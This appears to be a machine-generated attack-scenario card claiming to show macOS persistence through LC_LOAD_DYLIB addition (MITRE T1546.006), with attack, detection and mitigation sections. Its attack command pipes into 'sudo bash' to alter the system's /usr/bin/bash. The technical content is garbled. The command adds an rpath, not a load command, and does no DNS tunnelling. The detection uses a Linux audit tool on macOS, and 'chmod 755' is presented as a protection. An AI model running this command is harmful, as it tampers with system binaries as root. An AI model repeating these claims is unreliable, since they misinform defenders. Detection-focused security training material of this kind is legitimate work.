---
type: campaign
scenario_id: 423
tactic: Persistence
technique: "T1546.006: LC_LOAD_DYLIB Addition"
technique_id: T1546.006
tags: [campaign, lotl, persistence]
---

# Using LC_LOAD_DYLIB for DNS tunneling persistence on macOS.

## Threat Description
Using LC_LOAD_DYLIB for DNS tunneling persistence on macOS.

## Attack Command
```
echo 'install_name_tool -add_rpath /$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dylib) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) /usr/bin/bash' | sudo bash
```

## Detection Logic
Monitor dylib additions: `otool -l /usr/bin/bash | grep dnstunnel`; Audit file changes: `auditctl -w /usr/bin/bash -p wa`.

## Mitigation
Restrict binary modifications: `chmod 755 /usr/bin/bash`; Enable Gatekeeper: `spctl --master-enable`.

## AI Training Prompt
Train AI to detect LC_LOAD_DYLIB-based DNS tunneling persistence by analyzing dylib additions, binary modifications, and DNS query patterns; suggest binary protections.

## References
- MITRE ATT&CK T1546.006: https://attack.mitre.org/techniques/T1546/006/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
